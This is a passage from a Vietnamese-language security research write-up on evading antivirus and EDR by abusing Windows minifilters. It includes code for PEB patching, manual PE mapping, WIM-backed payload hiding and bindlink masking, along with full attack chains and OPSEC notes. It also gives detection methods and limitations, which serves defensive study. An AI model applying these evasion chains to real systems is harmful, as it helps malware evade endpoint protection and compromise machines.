 9. **** — Patch PEB.ProcessParameters Ghi địa chỉ remote parameters vào PEB+0x20 (ProcessParameters trên x64). NtWriteVirtualMemory(hProc, (PVOID)(peb + 0x20), &remote_params_addr, sizeof(ULONG_PTR), NULL);
 10. **** — NtCreateThreadEx() → Chạy process Tạo initial thread tại ImageBase + EntryPointRVA. Process bắt đầu chạy. NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (PVOID)(image_base + ep_rva), NULL, 0, 0, 0, 0, NULL);

#### PEB Layout (x64) — Các offset quan trọng

```c
struct PEB { // Process Environment Block (x64)

    +0x00 BOOLEAN InheritedAddressSpace;

    +0x01 BOOLEAN ReadImageFileExecOptions;

    +0x02 BOOLEAN BeingDebugged; // ← IsDebuggerPresent() đọc field này

    +0x03 BOOLEAN BitField;

    +0x08 PVOID   Mutant;

    +0x10 PVOID   ImageBaseAddress; // ← NtReadVirtualMemory đọc trường này

    +0x18 PVOID   Ldr; // → PEB_LDR_DATA (danh sách loaded modules)

    +0x20 PVOID   ProcessParameters; // ← NtWriteVirtualMemory ghi trường này

    +0x28 PVOID   SubSystemData;

    +0x30 PVOID   ProcessHeap;

    +0x38 PVOID   FastPebLock;

...  // tổng ~0x7C8 bytes trên Win10+

    };
```

#### Delta Relocation cho RTL_USER_PROCESS_PARAMETERS

`RtlCreateProcessParametersEx()` tạo struct trong **local process memory**. Struct chứa nhiều `UNICODE_STRING` và pointer trỏ vào buffer nằm TRONG chính struct đó (self-referential). Khi ghi struct sang remote process tại địa chỉ khác, tất cả pointer bên trong đều sai. Cần **delta relocation**:

```
// delta = remote_address - local_address
LONG_PTR delta = (LONG_PTR)(remote_params) - (LONG_PTR)(local_params);

// Với mỗi embedded pointer: nếu nó trỏ vào phạm vi của struct cũ,
// thêm delta để nó trỏ đến vị trí tương ứng trong struct mới
void fix_pointer(ULONG_PTR *ptr, ULONG_PTR local_base,
                 ULONG_PTR local_end, LONG_PTR delta) {
    if (*ptr >= local_base && *ptr < local_end)
        *ptr += delta;
}

// Các field cần fix:
fix_us(&p->CurrentDirectory.DosPath,...);  // UNICODE_STRING.Buffer
fix_us(&p->DllPath,...);
fix_us(&p->ImagePathName,...);
fix_us(&p->CommandLine,...);
fix_pointer(&p->Environment,...);          // PVOID
fix_us(&p->WindowTitle,...);
fix_us(&p->DesktopInfo,...);
fix_us(&p->ShellInfo,...);
fix_us(&p->RuntimeData,...);
fix_pointer(&p->PackageDependencyData,...);
fix_us(&p->RedirectionDllName,...);
fix_us(&p->HeapPartitionName,...);

// 32 CurrentDirectories — mỗi entry có DosPath.Buffer
for (int i = 0; i < 32; i++)
    fix_us(&p->CurrentDirectories[i].DosPath,...);

// Tail pointers — vùng bộ nhớ SAU struct fields đã biết
// Chứa data buffers mà UNICODE_STRING.Buffer trỏ đến
// Scan từng ULONG_PTR-sized slot, fix nếu trỏ vào struct cũ
size_t tail_len = params->MaximumLength - sizeof(*params);
for (offset = 0; offset + sizeof(ULONG_PTR) <= tail_len; offset += sizeof(ULONG_PTR)) {
    ULONG_PTR *slot = (ULONG_PTR *)(tail + offset);
    if (*slot >= local_base && *slot < local_end)
        *slot += delta;
}
```

### Mode "load" — Manual PE Mapping

Map PE file vào address space của process hiện tại, giống reflective DLL injection:

#### 1. Đọc raw PE và validate headers

```
BYTE *raw = malloc(file_size);
ReadFile(hFile, raw, file_size, &rd, NULL);
IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)raw;
// Validate: dos->e_magic == 0x5A4D ("MZ")
IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
// Validate: nt->Signature == 0x00004550 ("PE\0\0")
```

#### 2. Allocate memory tại preferred ImageBase

```
BYTE *base = VirtualAlloc(
    (PVOID)nt->OptionalHeader.ImageBase,  // Preferred base
    nt->OptionalHeader.SizeOfImage,       // Total virtual size
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE);                      // RW ban đầu, set protection sau
// Nếu preferred base đã bị chiếm → VirtualAlloc(NULL,...) ở địa chỉ bất kỳ
```

#### 3. Copy headers + sections

```
memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);
IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if (sec[i].SizeOfRawData > 0)
        memcpy(base + sec[i].VirtualAddress,     // Virtual address in memory
               raw + sec[i].PointerToRawData,    // Offset in file
               sec[i].SizeOfRawData);
}
```

#### 4. Process base relocations

```
// delta = actual_base - preferred_base
LONG_PTR delta = (LONG_PTR)base - (LONG_PTR)nt->OptionalHeader.ImageBase;
if (delta!= 0) {
    // Duyệt qua relocation table (DataDirectory[5])
    IMAGE_BASE_RELOCATION *block = (IMAGE_BASE_RELOCATION *)(base + reloc_rva);
    while (block->SizeOfBlock) {
        WORD *entries = (WORD *)(block + 1);
        DWORD count = (block->SizeOfBlock - 8) / 2;
        for (DWORD i = 0; i < count; i++) {
            int type = entries[i] >> 12;      // Top 4 bits = relocation type
            int off  = entries[i] & 0xFFF;    // Bottom 12 bits = page offset
            if (type == IMAGE_REL_BASED_DIR64)        // = 10, x64: fix 8-byte pointer
                *(ULONG_PTR *)(base + block->VirtualAddress + off) += delta;
            else if (type == IMAGE_REL_BASED_HIGHLOW)  // = 3, x86: fix 4-byte pointer
                *(DWORD *)(base + block->VirtualAddress + off) += (DWORD)delta;
            // type 0 (ABSOLUTE) = padding, skip
        }
        block = (IMAGE_BASE_RELOCATION *)((BYTE *)block + block->SizeOfBlock);
    }
}
```

#### 5. Resolve imports

```
IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)(base + import_rva);
while (imp->Name) {
    char *dll_name = (char *)(base + imp->Name);
    HMODULE hDll = LoadLibraryA(dll_name);   // Load import DLL

    IMAGE_THUNK_DATA *orig  = base + imp->OriginalFirstThunk; // Import Name Table
    IMAGE_THUNK_DATA *thunk = base + imp->FirstThunk;          // Import Address Table

    while (orig->u1.AddressOfData) {
        if (IMAGE_SNAP_BY_ORDINAL(orig->u1.Ordinal))
            thunk->u1.Function = GetProcAddress(hDll, MAKEINTRESOURCE(ordinal));
        else {
            IMAGE_IMPORT_BY_NAME *ibn = base + orig->u1.AddressOfData;
            thunk->u1.Function = GetProcAddress(hDll, ibn->Name);
        }
        orig++; thunk++;
    }
    imp++;
}
```

#### 6. Set section protections

```
for (each section) {
    DWORD protect;
    if (EXECUTE + WRITE)  protect = PAGE_EXECUTE_READWRITE;
    else if (EXECUTE)     protect = PAGE_EXECUTE_READ;
    else if (WRITE)       protect = PAGE_READWRITE;
    else                  protect = PAGE_READONLY;
    VirtualProtect(base + sec.VirtualAddress, sec.VirtualSize, protect, &old);
}
```

#### 7. Gọi entry point

```
typedef BOOL (WINAPI *DllMain_t)(HINSTANCE, DWORD, LPVOID);
DllMain_t entry = (DllMain_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
```

## Kỹ Thuật 3: WOFProvider — Windows Overlay Filter (Wof)

| Thuộc tính | Giá trị |
| --- | --- |
| Minifilter | `Wof.sys` |
| Altitude | 40700 (Compression band) |
| DLL | `wofutil.dll` |
| Yêu cầu Admin | Có |
| Bypass chính | AV không parse WIM container format khi on-write scanning |
| Binary | `wof_provider.exe` |

### WIM Format và WOF

**WIM** (Windows Imaging Format) là container format của Microsoft. Cấu trúc nội bộ:

| Thành phần | Mô tả |
| --- | --- |
| WIM Header | Magic "MSWIM\0\0\0", version, image count, compression type (XPRESS/LZX/LZMS), resource table offset |
| Resource Table | Danh sách resource entries — mỗi entry có SHA-1 hash, offset, compressed size, original size |
| Compressed Data | Nội dung file đã nén. Mỗi resource được định danh bằng **SHA-1 hash** của nội dung gốc |
| XML Metadata | Thông tin image (tên, mô tả, timestamps) |
| Integrity Table | Checksums cho verification (optional) |

**Windows Overlay Filter** (`Wof.sys`) có 2 provider:

- `WOF_PROVIDER_WIM` (= 1) — file backed by WIM container. Dùng cho WIMBoot, recovery images, và bị kỹ thuật này lạm dụng
- `WOF_PROVIDER_FILE` (= 2) — file backed by compressed version của chính nó. Dùng cho CompactOS (`compact /compactos:always`)

### Tại sao AV không phát hiện malware trong WIM?

Khi WIM file được ghi xuống disk, AV minifilter nhận `IRP_MJ_WRITE` callback. AV scan raw bytes — thấy WIM header ("MSWIM"), compressed data chunks, metadata. AV **không**:

- Parse WIM header để đọc resource table
- Giải nén từng resource (XPRESS/LZX decompression)
- Scan nội dung giải nén

Lý do: WIM là container format phức tạp, scan nội dung bên trong tốn CPU và I/O đáng kể. AV chỉ scan WIM khi user **chủ động yêu cầu** (right-click → Scan), lúc đó `mpengine.dll` sử dụng WIM parsing engine.

> **Cảnh báo BSOD**
>
>  WIM file **BẮT BUỘC** phải compressed. Dùng `dism /Compress:fast` hoặc `/Compress:max`. WIM tạo với `/Compress:none` gây **BSOD** (bug check) khi Wof.sys cố đọc dữ liệu từ uncompressed WIM — driver hardcodes decompression path.

### Luồng hoạt động chi tiết

#### Bước 1: Tạo WIM chứa payload

```
REM Giả sử payload nằm ở C:\temp\wof_src\malware.exe
dism /Capture-Image /ImageFile:C:\temp\payload.wim ^
     /CaptureDir:C:\temp\wof_src /Name:"WOF" /Compress:fast
```

#### Bước 2: Lấy SHA-1 hash của resource

```
REM SHA-1 hash của file GỐC (chưa nén) — Wof dùng hash này để lookup trong WIM
Get-FileHash -Algorithm SHA1 -Path "C:\temp\wof_src\malware.exe"
REM Output: A1B2C3D4E5F67890... (40 hex chars = 20 bytes)
```

Mỗi resource trong WIM được index bằng SHA-1 hash. Khi Wof cần cung cấp nội dung cho placeholder, nó:

1. Đọc WIM resource table
2. Tìm entry có SHA-1 hash match
3. Đọc compressed data tại offset trong entry
4. Giải nén (XPRESS/LZX) và trả về cho caller

#### Bước 3: Đăng ký WIM làm data source

```
LARGE_INTEGER data_source_id;
HRESULT hr = WofWimAddEntry(
    L"C:\\",                    // Volume — WIM phải nằm trên cùng volume
    L"C:\\temp\\payload.wim",   // WIM file path
    WIM_BOOT_NOT_OS_WIM,        // = 0 — không phải OS WIM
    1,                           // Image index (WIM có thể chứa nhiều images)
    &data_source_id              // Output: ID dùng cho WofSetFileDataLocation
);
// data_source_id = 1, 2, 3... tùy số lần đăng ký
```

#### Bước 4: Tạo placeholder và liên kết với WIM

```
// Tạo file rỗng (hoặc mở file có sẵn)
HANDLE hFile = CreateFileW(L"C:\\target\\malware.exe",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

// Thiết lập WIM backing cho file
WIM_EXTERNAL_FILE_INFO wfi = {0};
wfi.DataSourceId = data_source_id;          // Từ bước 3
memcpy(wfi.ResourceHash, sha1_bytes, 20);   // SHA-1 hash từ bước 2
wfi.Flags = 0;

WofSetFileDataLocation(hFile, WOF_PROVIDER_WIM, &wfi, sizeof(wfi));
// → Wof.sys gắn IO_REPARSE_TAG_WOF reparse point vào file
// → File trên disk trở nên rỗng (0 bytes data), chỉ có reparse data
// → Khi read: Wof intercept, đọc từ WIM, giải nén, trả về nội dung
CloseHandle(hFile);
```

### Cơ chế bypass chi tiết

Điểm bypass chính của WOFProvider **không phải altitude** mà là:

1. **On-write:** AV scan WIM file khi ghi → thấy opaque compressed container → không detect malware
2. **WofSetFileDataLocation:** Chỉ gắn reparse point metadata — không tạo write event cho nội dung malware → AV không có cơ hội scan
3. **On-access sau đó:** Khi placeholder được mở, Wof cung cấp nội dung → AV CÓ THỂ thấy nội dung trong post-op callback. Tuy nhiên, kết hợp với **BindLinks** sẽ che giấu nội dung khỏi path-based EDR scanning

### Cleanup

```
// Xóa WIM data source registration
WofWimRemoveEntry(L"C:\\", data_source_id);
// File placeholder trở lại trạng thái bình thường (rỗng hoặc invalid)
```

## Utils — Công Cụ Hỗ Trợ

| Lệnh | Chức năng | Mục đích trong chuỗi tấn công |
| --- | --- | --- |
| `utils.exe oplock <path>` | Đặt Level 1 oplock (`FSCTL_REQUEST_OPLOCK_LEVEL_1`) trên file, chờ đến khi process khác cố mở | Debugging/monitoring: biết khi nào AV cố scan file. Oplock break callback cho biết process nào đang truy cập |
| `utils.exe loaddll <path>` | Load DLL vào process hiện tại bằng `LoadLibraryA()`, in base address | Test DLL payload trước khi dùng IdMapper. Verify DllMain chạy đúng |
| `utils.exe query <path>` | Query File Reference Number bằng `GetFileInformationByHandle()` | **Bước bắt buộc** trước BindLinks: lấy FRN của payload TRƯỚC khi tạo bindlink (sau khi tạo bindlink, query bằng path sẽ trả FRN của backing file) |

#### Oplock hoạt động thế nào?

**Opportunistic Lock (Oplock)** là cơ chế kernel cho phép client "sở hữu tạm thời" một file. Có 4 level oplock (Level 1, Level 2, Batch, Filter). Level 1 oplock cấp exclusive access — khi process khác cố mở file, oplock bị "break" và holder nhận notification.

```
// Request Level 1 oplock (exclusive)
OVERLAPPED ov = {0};
ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1,
    NULL, 0, NULL, 0, &bytes, &ov);
// Returns ERROR_IO_PENDING — oplock granted, chờ break

WaitForSingleObject(ov.hEvent, INFINITE);
// → Khi process khác (ví dụ: MsMpEng.exe) mở file → oplock break
// → Event signaled → ta biết ai đang cố truy cập
```

## Chuỗi Tấn Công Kết Hợp

Mỗi kỹ thuật đảm nhiệm một vai trò khác nhau:

| Giai đoạn | Mục tiêu | Kỹ thuật | Minifilter | Admin? |
| --- | --- | --- | --- | --- |
| Drop | Đưa payload xuống disk, bypass static scan | SyncProvider *hoặc* WOFProvider | CldFlt / Wof | Không / Có |
| Query | Lấy FRN trước khi tạo bindlink | Utils query | — | Không |
| Conceal | Che giấu nội dung khỏi path-based EDR | BindLinks | bindflt | Có |
| Execute | Thực thi payload, bypass bindlink bằng FRN | IdMapper | — | Có |
| Cleanup | Xóa dấu vết (bindlink, sync root) | BindLinks remove, Disconnect | bindflt | Có |

### Chuỗi A: Non-admin (SyncProvider only)

1. **** — sync_provider.exe (Mode 2) Drop payload qua double hydration. AV scan lần 1 → file sạch pass. Hydration lần 2 → payload ghi đè mà AV không rescan.
 2. **** — Thực thi trực tiếp Chạy payload.exe bằng cách thông thường. Rủi ro: EDR có PsSetCreateProcessNotifyRoutineEx callback → rescan binary khi tạo process → có thể bị phát hiện ở bước này.

### Chuỗi B: Full chain (Admin)

1. **** — Drop: sync_provider.exe (Mode 2) hoặc wof_provider.exe Payload xuống disk mà AV không detect.
 2. **** — Query: utils.exe query C:\SyncRoot\payload.exe Lấy FRN: 0x000600000000A1B2. PHẢI làm bước này TRƯỚC khi tạo bindlink.
 3. **** — Conceal: bindlinks.exe create payload.exe certutil.exe EDR mở payload bằng path → thấy certutil.exe (Microsoft signed, clean).
 4. **** — Execute: id_mapper.exe spawn C 0x000600000000A1B2 Mở payload bằng FRN (bypass bindlink) → NtCreateProcessEx → PEB patch → NtCreateThreadEx. Hoặc dùng load mode cho manual PE mapping.
 5. **** — Cleanup: bindlinks.exe remove payload.exe Xóa bindlink. Disconnect + Unregister sync root. Xóa WIM nếu dùng WOFProvider.

### OPSEC — Dấu vết để lại

| Artifact | Vị trí | Mức độ |
| --- | --- | --- |
| Sync root registration | `HKCU\...\SyncRootManager` | Cao — tồn tại cho đến khi unregister |
| ETW events (CloudFiles) | `Microsoft-Windows-CloudFiles` | Trung bình — cần ETW consumer đang listen |
| ETW events (BindFlt) | `Microsoft-Windows-BindFlt` | Trung bình |
| bindfltapi.dll LoadLibrary | Process module list | Thấp — tạm thời |
| CldFlt instance trên volume | `fltmc instances` | Trung bình — tồn tại khi connected |
| Placeholder file attributes | `FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS` | Cao — bất thường cho file.exe |
| WIM file trên disk | File path cung cấp bởi attacker | Cao — file vật lý tồn tại |
| Reparse point (WOF) | `IO_REPARSE_TAG_WOF` trên placeholder | Trung bình |

## Phát Hiện & Phòng Chống

### Phát hiện SyncProvider

| Phương pháp | Chi tiết | Độ tin cậy |
| --- | --- | --- |
| Registry monitoring | Monitor `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\SyncRootManager` cho sync root mới. Provider name và GUID không thuộc whitelist (OneDrive, iCloud, Dropbox) → alert | Cao |
| ETW: Microsoft-Windows-CloudFiles | Events: SyncRootRegistered, ConnectionOpened, PlaceholderCreated, FetchDataRequested. Keyword mask `0x1` cho sync operations | Cao |
| CldApi.dll load monitoring | Monitor `LoadLibrary("CldApi.dll")` từ process không phải OneDrive/iCloud/known providers. Kết hợp với process command line analysis | Trung bình |
| Minifilter instance enumeration | `fltmc instances` — CldFlt instance xuất hiện trên volume bất thường (không phải OneDrive sync folder) | Trung bình |
| File attribute anomaly | Executable file (.exe/.dll) có `FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS` (0x400000) — cực kỳ bất thường ngoài OneDrive folder | Cao |
| Process creation rescan | EDR bỏ qua cached scan result, rescan binary content mỗi khi `PsSetCreateProcessNotifyRoutineEx` callback fire. Đọc file content trực tiếp (không qua cache) bằng FRN hoặc section object | Cao |

### Phát hiện BindLinks

| Phương pháp | Chi tiết | Độ tin cậy |
| --- | --- | --- |
| ETW: Microsoft-Windows-BindFlt | Events khi bindlink được tạo/xóa. Provider GUID: kiểm tra BindFlt provider list | Cao |
| NtCreateFile với FILE_OPEN_BY_FILE_ID | Monitor syscall `NtCreateFile` với `FILE_OPEN_BY_FILE_ID` flag. Ứng dụng hợp pháp hiếm khi dùng — detection rate cao, false positive thấp | Cao |
| Cross-reference hash | EDR mở file bằng cả **path** và **FRN**, hash cả hai nội dung. Nếu hash khác nhau → bindlink đang active trên file đó | Cao |
| bindfltapi.dll load | Monitor `LoadLibrary("bindfltapi.dll")` từ process không phải Windows Container runtime, WSL, hoặc Windows Sandbox | Trung bình |
| NtCreateProcessEx monitoring | `NtCreateProcessEx` is undocumented and rarely used by legitimate apps. Combined with FRN-based file open → strong indicator | Cao |

### Phát hiện WOFProvider

| Phương pháp | Chi tiết | Độ tin cậy |
| --- | --- | --- |
| WofWimAddEntry monitoring | Monitor calls to `WofWimAddEntry`. Đăng ký WIM file lạ làm external data source bất thường trong production | Cao |
| WIM file on-write parsing | AV chủ động parse WIM format khi file WIM mới được tạo trên disk. Decompress resources, scan nội dung bên trong | Cao |
| IO_REPARSE_TAG_WOF detection | File executable có reparse tag `0x80000017` (IO_REPARSE_TAG_WOF) — bất thường cho file.exe/.dll bên ngoài Windows system directories | Trung bình |
| wofutil.dll load | Monitor LoadLibrary cho `wofutil.dll` từ non-system processes | Trung bình |
| DISM log analysis | DISM ghi log tại `%WINDIR%\Logs\DISM\dism.log` khi tạo WIM | Trung bình |

## Hạn Chế & Rủi Ro Thực Tế

### Hạn chế theo kỹ thuật

#### SyncProvider

- **Process creation callback:** CrowdStrike Falcon, SentinelOne, MDE đều rescan binary khi `PsSetCreateProcessNotifyRoutineEx` fire — SyncProvider alone không bypass lớp này
- **Delay 10 giây:** Cửa sổ timing giữa 2 lần hydration. Nếu AV có periodic rescan hoặc USN-independent monitoring, có thể phát hiện
- **Placeholder visible:** File có `FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS` (0x400000) — dễ detect qua directory enumeration
- **Chỉ bypass static scan:** Không bypass AMSI, ETW, kernel callback, behavior-based detection
- **Sync root registry entry:** Tồn tại cho đến khi unregister — forensic artifact rõ ràng
- **Explorer UI:** Placeholder hiển thị cloud icon trong Explorer — user có thể nhận ra file bất thường

#### BindLinks

- **Admin required:** Communication port DACL chỉ cho SYSTEM + Administrators. Không thể privilege escalation qua kỹ thuật này
- **Kernel callback vẫn fire:** `PsSetCreateProcessNotifyRoutineEx` vẫn nhận notification cho mọi process creation — EDR biết có process mới. Bindlink chỉ lừa EDR khi EDR mở file bằng path để verify
- **Section-based detection:** EDR tiên tiến có thể compare section object hash với file-on-disk hash. Nếu dùng `NtCreateSection(SEC_IMAGE)` → section hash là malware, nhưng file path → certutil.exe → mismatch → alert
- **FRN-based access logged:** Một số EDR monitor `NtCreateFile` với `FILE_OPEN_BY_FILE_ID` — pattern rất hiếm trong software hợp pháp
- **IdMapper spawn limitations:** Binary có activation context phức tạp, SxS manifests, hoặc embedded COM objects có thể fail vì `NtCreateProcessEx` không chạy Windows loader đầy đủ
- **Manual mapper limitations:** Mode "load" không xử lý TLS callbacks, exception handler registration (SEH/VEH setup), delay-load imports, API sets, hoặc loader notifications (`LdrRegisterDllNotification`). Phức tạp PE sẽ crash

#### WOFProvider

- **Admin required:** `WofWimAddEntry()` cần quyền admin
- **BSOD risk:** Uncompressed WIM gây crash — lỗi operator dễ xảy ra
- **WIM file on disk:** Artifact vật lý — forensics dễ tìm thấy
- **DISM traces:** Log tại `%WINDIR%\Logs\DISM\dism.log` + temp files
- **Defender manual scan:** Right-click WIM → Scan → mpengine parse WIM format → phát hiện malware bên trong
- **Cần kết hợp:** WOF alone chỉ bypass on-write scan. Cần BindLinks + IdMapper cho runtime evasion

### EDR hiện đại — Nhiều lớp phòng thủ

Minifilter evasion chỉ bypass **một lớp** (file-based scanning). EDR enterprise có nhiều lớp khác:

| Lớp phòng thủ | Cơ chế | Bypass bằng minifilter? |
| --- | --- | --- |
| User-mode hooking | EDR hook `ntdll.dll` functions (NtCreateFile, NtWriteVirtualMemory...) trong process space | Không |
| Kernel callbacks | `PsSetCreateProcessNotifyRoutineEx`, `PsSetCreateThreadNotifyRoutine`, `PsSetLoadImageNotifyRoutine` | Không |
| ETW | Kernel-level telemetry: process, thread, image load, network, registry events | Không |
| AMSI | Scan in-memory content: PowerShell,.NET assembly, VBScript, JScript | Không |
| Behavior detection | Phân tích process tree, API call sequences, network patterns, registry modifications | Không |
| Memory scanning | Periodic scan memory của running processes cho unpacked/decrypted malware | Không |
| Object callbacks | `ObRegisterCallbacks` — detect handle duplication, process/thread handle access | Không |

> **Kết luận**
>
>  Các kỹ thuật minifilter là **mảnh ghép chuyên biệt** trong arsenal — bypass lớp static file scanning và path-based content inspection. Để hoạt động trong môi trường EDR enterprise, cần kết hợp: **direct syscall** (bypass ntdll hooks), **callback removal** (patch kernel notify routines), **ETW patching** (blind TI provider), và **AMSI bypass**. Giá trị nghiên cứu cao nhất nằm ở việc hiểu **kiến trúc minifilter altitude ordering** — kiến thức này áp dụng rộng rãi trong cả offensive và defensive security.
